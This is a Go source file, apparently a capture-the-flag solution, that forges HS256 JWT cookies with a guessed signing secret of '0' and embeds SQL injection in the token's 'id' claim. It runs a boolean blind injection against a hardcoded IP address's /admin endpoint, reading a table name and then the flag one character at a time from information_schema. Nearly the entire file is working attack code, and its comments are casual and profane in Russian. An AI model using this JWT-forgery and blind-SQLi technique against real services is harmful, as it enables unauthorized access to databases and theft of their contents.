package main

// CYBHACK GOD
// EXPLOIT FOR SECOND PART OF FLAG
import (
	"fmt"
	"net/http"

	jwt "github.com/dgrijalva/jwt-go"
)

func SendRequestWithAuthToken(token string) int {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, err := http.NewRequest("GET", "http://45.89.65.147:13377/admin", nil)

	if err != nil {
		fmt.Printf("error = %s \n", err)
	}
	req.Header.Set("Cookie", fmt.Sprintf("AuthToken=%s", token))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("error = %s \n", err)
	}
	return resp.StatusCode
}

func EncodeJWT(id string) string {
	token := jwt.New(jwt.SigningMethodHS256)
	claims := token.Claims.(jwt.MapClaims)
	claims["id"] = id

	secretKey := []byte("0") // Вы уже все поняли, да? Ведь да???

	signedToken, err := token.SignedString(secretKey)
	if err != nil {
		panic(err)
	}
	return signedToken

}

// С название базы можно просто побаловаться, глобально похуй
func GetDatabaseLength() int {
	length := 1
	for ; length < 100; length++ {
		json := fmt.Sprintf("is_admin=true AND (select length(current_database()))=%d", length)
		token := EncodeJWT(json)
		if SendRequestWithAuthToken(token) == 200 {
			break
		}
	}
	return length
}

func GetDatabaseName(length int) string {
	name := ""
	for i := 1; i < length+1; i++ {
		ord := 48
		for ; ord < 170; ord++ {
			json := fmt.Sprintf("is_admin=true AND ascii(SUBSTR((SELECT current_database()),%d,1))=%d", i, ord)
			token := EncodeJWT(json)
			if SendRequestWithAuthToken(token) == 200 {
				name += string(rune(ord))
				break
			}
		}
	}
	return name
}

func GetFlagTableLength() int {
	length := 1
	for ; length < 100; length++ {
		json := fmt.Sprintf("is_admin=true AND (SELECT length(table_name) FROM information_schema.tables LIMIT 1 OFFSET 1)=%d", length)
		token := EncodeJWT(json)
		if SendRequestWithAuthToken(token) == 200 {
			break
		}
	}
	return length
}

func GetFlagTableName(length int) string {
	name := ""
	for i := 1; i < length+1; i++ {
		ord := 48
		for ; ord < 170; ord++ {
			json := fmt.Sprintf("is_admin=true AND ascii(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 1),%d,1))=%d", i, ord)
			token := EncodeJWT(json)
			if SendRequestWithAuthToken(token) == 200 {
				name += string(rune(ord))
				break
			}
		}
	}
	return name
}

func GetFlagLength(tableName string) int {
	length := 1
	for ; length < 100; length++ {
		json := fmt.Sprintf("is_admin=true AND (SELECT length(flag) FROM %s LIMIT 1 OFFSET 0)=%d", tableName, length)
		token := EncodeJWT(json)
		if SendRequestWithAuthToken(token) == 200 {
			break
		}
	}
	return length
}

func GetFlag(length int, tableName string) string {
	name := ""
	for i := 1; i < length+1; i++ {
		ord := 48
		for ; ord < 170; ord++ {
			json := fmt.Sprintf("is_admin=true AND (SELECT ascii(SUBSTR((SELECT flag FROM %s LIMIT 1 OFFSET 0),%d,1)))=%d", tableName, i, ord)
			token := EncodeJWT(json)
			if SendRequestWithAuthToken(token) == 200 {
				name += string(rune(ord))
				break
			}
		}
	}
	return name
}

func main() {
	// Приколы с названием базы
	// len := GetDatabaseLength()
	// fmt.Println("Database name:", GetDatabaseName(len))

	flagTableLen := GetFlagTableLength()
	flagTableName := GetFlagTableName(flagTableLen)
	fmt.Println("Flag table name:", flagTableName)

	flagLength := GetFlagLength(flagTableName)
	fmt.Println("Flag length:", flagLength)
	fmt.Println("Flag:", GetFlag(flagLength, flagTableName))
}
